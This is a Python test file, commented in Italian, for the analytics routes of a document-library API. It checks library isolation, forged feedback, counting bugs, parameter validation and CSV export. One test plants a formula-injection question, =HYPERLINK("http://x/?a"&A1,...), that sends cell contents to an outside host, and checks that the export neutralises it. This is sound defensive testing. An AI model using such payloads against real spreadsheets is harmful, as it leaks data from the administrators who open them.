"""Analytics: chi vede quali biblioteche, chi puo' falsare il rapporto, e i
numeri che il cruscotto mostra.

L'ultimo dei sette sottosistemi. Quattro difetti, di tre tipi diversi.

1. Isolamento. `GET /api/analytics/overview` richiede il ruolo `viewer`, cioe'
   qualunque utente autenticato, e risponde con `top_libraries`: l'elenco degli
   identificativi di biblioteca con quante domande hanno ricevuto. Le
   analitiche leggono l'intero file senza filtrare per le biblioteche a cui
   chi chiede ha davvero accesso, quindi un utente qualsiasi apprende
   l'esistenza e il livello di attivita' di ogni biblioteca privata
   dell'azienda. Non e' il contenuto, ma e' proprio il confine che il prodotto
   promette di tenere.

2. Chiunque poteva falsare il rapporto. `POST /api/analytics/feedback`
   accettava qualunque `event_id`, senza verificare che l'evento esista o che
   sia una domanda di chi manda il feedback, e senza limite di frequenza. Il
   rapporto Knowledge Gaps e' cio' su cui un amministratore decide quali
   documenti scrivere: bastava un ciclo di POST per farci comparire la
   domanda che si voleva.

3. Un numero sbagliato. `negative_feedback` veniva inizializzato a 1 e poi
   incrementato nella stessa iterazione: un feedback negativo ne contava due.

4. Un numero falso. `positive_feedback_rate` valeva 100.0 quando i feedback
   erano zero — un cruscotto che dichiara soddisfazione perfetta senza avere
   ricevuto un solo giudizio.

Piu' la validazione degli argomenti che le rotte non avevano: `days` e `limit`
arrivavano come interi liberi, e `days` abbastanza grande faceva sollevare
OverflowError a timedelta, cioe' 500.
"""

import json
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

import api.analytics
import api.auth
import api.libraries
import config
from api import app
from core.governance import create_or_update_user
from core.rate_limiter import get_rate_limiter

PASSWORD_CAPO = "StrongPassword!123"
PASSWORD_OSPITE = "PasswordOspite!123"


@pytest.fixture
def istanza(tmp_path, monkeypatch):
    app_dir = tmp_path / "app"
    app_dir.mkdir()
    test_cfg = config.cfg.replace(
        BASE_DIR=str(app_dir), DATABASE_URL="", ADMIN_USERNAME="capo", ADMIN_PASSWORD=PASSWORD_CAPO, API_KEY=""
    )
    for percorso in ("config.cfg", "api.auth.cfg", "api.libraries.cfg", "core.analytics.cfg"):
        monkeypatch.setattr(percorso, test_cfg)
    monkeypatch.setattr(api.libraries, "_store", None)
    api.auth.session_store.clear()
    api.auth.login_guard.clear()
    get_rate_limiter().reset()
    return test_cfg


def _accedi(username: str, password: str) -> TestClient:
    client = TestClient(app)
    assert client.post("/api/auth/login", json={"username": username, "password": password}).status_code == 200
    return client


@pytest.fixture
def due_biblioteche(istanza):
    """Il capo ha una biblioteca privata; l'ospite non ne fa parte."""
    capo = _accedi("capo", PASSWORD_CAPO)
    riservata = capo.post("/api/libraries", json={"name": "Buste paga", "visibility": "private"}).json()["id"]
    capo.post(
        f"/api/libraries/{riservata}/documents",
        files={"file": ("nota.txt", b"La pausa pranzo dura 60 minuti.", "text/plain")},
    )
    # Una domanda registrata: e' cio' che alimenta le analitiche.
    capo.post(f"/api/libraries/{riservata}/ask", json={"question": "Quanto dura la pausa pranzo?"})
    create_or_update_user(istanza.USERS_FILE, "ospite", "viewer", PASSWORD_OSPITE)
    ospite = _accedi("ospite", PASSWORD_OSPITE)
    return capo, ospite, riservata


def _eventi(istanza) -> list[dict]:
    percorso = Path(istanza.ANALYTICS_FILE)
    if not percorso.exists():
        return []
    return [json.loads(riga) for riga in percorso.read_text(encoding="utf-8").splitlines() if riga.strip()]


# ============================================================
# Isolamento: le analitiche non devono rivelare biblioteche altrui
# ============================================================


def test_the_overview_does_not_name_libraries_the_caller_cannot_access(istanza, due_biblioteche):
    _capo, ospite, riservata = due_biblioteche

    esito = ospite.get("/api/analytics/overview")

    assert esito.status_code == 200, esito.text
    assert riservata not in esito.text, "l'identificativo di una biblioteca privata e' esposto a chi non vi accede"


def test_the_overview_does_not_count_queries_made_in_libraries_the_caller_cannot_access(istanza, due_biblioteche):
    """Anche il solo conteggio dice qualcosa: quante domande riceve un archivio
    a cui non si ha accesso e' informazione sull'attivita' altrui."""
    _capo, ospite, _riservata = due_biblioteche

    esito = ospite.get("/api/analytics/overview").json()

    assert esito["total_queries"] == 0, f"conteggiate domande altrui: {esito['total_queries']}"


def test_the_owner_still_sees_their_own_library(istanza, due_biblioteche):
    """Chiudere la falla non deve rendere il cruscotto vuoto per chi ha
    diritto di vederlo."""
    capo, _ospite, riservata = due_biblioteche

    esito = capo.get("/api/analytics/overview").json()

    assert esito["total_queries"] >= 1
    assert any(voce["library_id"] == riservata for voce in esito["top_libraries"])


# ============================================================
# Chiunque poteva falsare il rapporto su cui si decide
# ============================================================


def test_feedback_for_an_event_that_does_not_exist_is_refused(istanza, due_biblioteche):
    _capo, ospite, _riservata = due_biblioteche

    esito = ospite.post("/api/analytics/feedback", json={"event_id": "inventato-000", "rating": -1})

    assert esito.status_code == 404, f"accettato feedback per un evento inesistente: {esito.status_code}"


def test_feedback_for_someone_elses_question_is_refused(istanza, due_biblioteche):
    """L'evento esiste, ma e' una domanda del capo. Il rapporto Knowledge Gaps
    serve a decidere quali documenti scrivere: chi non ha fatto la domanda non
    deve poterne influenzare il giudizio."""
    _capo, ospite, _riservata = due_biblioteche
    evento = next(e for e in _eventi(istanza) if e.get("type") == "query")

    esito = ospite.post("/api/analytics/feedback", json={"event_id": evento["event_id"], "rating": -1})

    assert esito.status_code in (403, 404), f"accettato feedback su una domanda altrui: {esito.status_code}"


def test_the_same_feedback_cannot_be_submitted_twice(istanza, due_biblioteche):
    """Senza questo, un ciclo di POST gonfia `negative_feedback` a piacere e
    porta in cima al rapporto la domanda che si vuole."""
    capo, _ospite, _riservata = due_biblioteche
    evento = next(e for e in _eventi(istanza) if e.get("type") == "query")

    primo = capo.post("/api/analytics/feedback", json={"event_id": evento["event_id"], "rating": -1})
    secondo = capo.post("/api/analytics/feedback", json={"event_id": evento["event_id"], "rating": -1})

    assert primo.status_code == 200, primo.text
    assert secondo.status_code == 409, f"secondo feedback accettato: {secondo.status_code}"


def test_the_author_of_the_question_can_still_leave_feedback(istanza, due_biblioteche):
    """E' il motivo per cui la rotta esiste: il pollice su/giu' nella chat."""
    capo, _ospite, _riservata = due_biblioteche
    evento = next(e for e in _eventi(istanza) if e.get("type") == "query")

    esito = capo.post("/api/analytics/feedback", json={"event_id": evento["event_id"], "rating": 1})

    assert esito.status_code == 200, esito.text
    assert esito.json()["ok"] is True


# ============================================================
# I numeri che il cruscotto mostra
# ============================================================


def test_one_negative_feedback_is_counted_once(istanza, due_biblioteche):
    """Era inizializzato a 1 e poi incrementato nella stessa iterazione.

    Il gap si costruisce col feedback negativo, non con una domanda senza
    evidenza: `is_gap` include entrambi, e un feedback negativo e' l'unica
    delle due che il test puo' provocare in modo deterministico — se la
    domanda inventata trovasse per caso un'evidenza, il test non proverebbe
    niente.
    """
    capo, _ospite, _riservata = due_biblioteche
    evento = next(e for e in _eventi(istanza) if e.get("type") == "query")
    capo.post("/api/analytics/feedback", json={"event_id": evento["event_id"], "rating": -1})

    gaps = capo.get("/api/analytics/knowledge-gaps").json()["gaps"]

    interessati = [g for g in gaps if g["negative_feedback"] > 0]
    assert interessati, "il feedback negativo non compare nel rapporto"
    assert interessati[0]["negative_feedback"] == 1, (
        f"un feedback negativo contato {interessati[0]['negative_feedback']} volte"
    )


def test_no_feedback_is_not_reported_as_perfect_satisfaction(istanza, due_biblioteche):
    """Valeva 100.0 senza aver ricevuto un solo giudizio: un cruscotto che
    dichiara soddisfazione perfetta perche' non sa niente.

    Serve almeno una domanda registrata: senza eventi la funzione esce prima
    per un'altra strada e restituisce 0.0, quindi un test su un archivio vuoto
    passerebbe senza toccare il difetto.
    """
    capo, _ospite, _riservata = due_biblioteche

    esito = capo.get("/api/analytics/overview").json()

    assert esito["total_feedback"] == 0
    assert esito["positive_feedback_rate"] != 100.0, (
        "100% di feedback positivi con zero feedback ricevuti: indistinguibile da un dato reale"
    )


# ============================================================
# Gli argomenti delle rotte, che nessun modello validava
# ============================================================


def test_an_enormous_day_count_is_refused_not_a_server_error(istanza, due_biblioteche):
    """`timedelta(days=...)` solleva OverflowError oltre il suo limite: un
    parametro di query diventava un errore del server.

    Con l'archivio delle analitiche assente la funzione esce prima e il
    difetto non si vede: serve almeno un evento registrato.
    """
    capo, _ospite, _riservata = due_biblioteche

    esito = capo.get("/api/analytics/overview", params={"days": 10**12})

    assert esito.status_code == 422, f"atteso un rifiuto, ricevuto {esito.status_code}"


def test_a_negative_day_count_is_refused(istanza, due_biblioteche):
    capo, _ospite, _riservata = due_biblioteche

    esito = capo.get("/api/analytics/overview", params={"days": -5})

    assert esito.status_code == 422


def test_a_negative_limit_is_refused(istanza, due_biblioteche):
    """`sorted_gaps[:-5]` non e' un errore in Python: toglie in silenzio le
    ultime cinque voci del rapporto."""
    capo, _ospite, _riservata = due_biblioteche

    esito = capo.get("/api/analytics/knowledge-gaps", params={"limit": -5})

    assert esito.status_code == 422


def test_the_csv_export_still_works_for_an_admin(istanza, due_biblioteche):
    capo, _ospite, _riservata = due_biblioteche

    esito = capo.get("/api/analytics/export")

    assert esito.status_code == 200, esito.text
    assert esito.headers["content-type"].startswith("text/csv")
    assert "Domanda" in esito.text


def test_a_question_that_looks_like_a_formula_is_neutralised_in_the_csv(istanza, due_biblioteche):
    """Il CSV lo apre un amministratore in Excel, e le domande sono testo
    scritto dagli utenti: un valore che comincia per `=` viene eseguito come
    formula. Basta una domanda scritta ad arte perche' il foglio faccia
    qualcosa quando l'amministratore lo apre."""
    capo, _ospite, riservata = due_biblioteche
    capo.post(f"/api/libraries/{riservata}/ask", json={"question": '=HYPERLINK("http://x/?a"&A1,"clicca")'})
    evento = next(e for e in _eventi(istanza) if e.get("query", "").startswith("=HYPERLINK"))
    capo.post("/api/analytics/feedback", json={"event_id": evento["event_id"], "rating": -1})

    esito = capo.get("/api/analytics/export")

    assert esito.status_code == 200
    righe = [r for r in esito.text.splitlines() if "HYPERLINK" in r]
    assert righe, "la domanda non e' nel rapporto: il test non prova niente"
    assert not righe[0].lstrip('"').startswith("=HYPERLINK"), f"formula non neutralizzata: {righe[0][:60]}"
